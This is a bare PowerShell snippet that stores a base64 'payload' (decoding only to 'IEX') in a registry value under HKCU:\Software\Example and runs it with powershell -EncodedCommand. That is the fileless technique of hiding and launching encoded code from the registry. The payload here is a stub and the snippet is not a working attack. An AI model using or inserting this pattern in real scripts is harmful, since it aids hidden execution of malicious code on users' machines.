$payload = "SQBFAFgA"
Set-ItemProperty -Path "HKCU:\Software\Example" -Name Payload -Value ([Convert]::FromBase64String($payload))
powershell.exe -EncodedCommand $payload
